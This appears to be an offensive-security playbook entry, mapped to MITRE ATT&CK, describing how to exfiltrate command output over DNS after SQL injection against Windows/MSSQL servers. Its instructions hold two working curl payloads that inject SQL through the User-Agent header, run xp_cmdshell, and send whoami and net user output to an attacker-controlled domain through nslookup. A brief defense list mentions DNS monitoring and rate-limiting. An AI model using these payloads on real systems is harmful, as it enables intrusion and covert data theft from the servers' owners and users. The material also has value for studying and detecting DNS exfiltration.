---
tags:
  - exfiltration
  - dns-tunneling
type: procedure
tools: []
tactics:
  - '[[Exfiltration]]'
commands:
  - '[[commands/exfil-via-dns]]'
verified: false
platforms:
  - Windows
  - Network
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
updated_at: '2025-12-14T03:46:20.428Z'
skill_level: advanced
impact_level: high
detection_risk: low
sub_techniques: []
id: ec9fe092-26a3-409b-a4db-29cf02ff72ba
validated: true
mitre_tactics:
  - '[[Exfiltration]]'
mitre_techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
---
# Exfiltrate Command Output via DNS Requests

## Summary

This procedure exfiltrates output from xp_cmdshell-executed OS commands using DNS queries, bypassing direct response limitations in blind SQL injection scenarios.

## Description

Encode command output as DNS subdomains via nslookup or similar in xp_cmdshell. Requires control of a DNS server. Targets Windows/MSSQL; outcomes: stealthy data retrieval like user lists or files.

## Requirements

1. xp_cmdshell RCE from prior steps
2. Attacker-controlled DNS server to log queries
3. Chunking logic for large outputs (base64 or char-by-char)

## Defense

Defensive measures and detection strategies:

- Monitor outbound DNS queries from servers for unusual patterns
- Block or rate-limit DNS to external domains from app servers
- Use DNS logging to detect tunneling attempts

## Objectives

1. Trigger DNS lookup with encoded output
2. Capture exfiltrated data on attacker DNS
3. Achieve full compromise visibility

## Instructions

### Step 1: Simple Output Exfil

**Context**: Use nslookup to send output to attacker DNS.

**Command** ([[commands/exfil-via-dns]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC xp_cmdshell 'nslookup whoami.attacker-dns.com';--" -d "username=test&password=test"
```

> Check DNS logs for 'whoami.attacker-dns.com' query.

### Step 2: Advanced Chunked Exfil

**Context**: For larger output, use PowerShell or loops to chunk data.

**Command** ([[commands/exfil-via-dns]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC xp_cmdshell 'for /f %i in (''net user'') do nslookup %i.attacker-dns.com';--" -d "username=test&password=test"
```

> Multiple DNS queries with output fragments.

## MITRE ATT&CK Mapping

### Tactics

- [[Exfiltration]]

### Techniques

- [[Exfiltration Over Unencrypted Non-C2 Protocol]]

### Sub-Techniques


## Commands Used

- [[commands/exfil-via-dns]]

## Tools Used


## Tags

- [[Exfiltration]]
- [[dns-tunneling]]
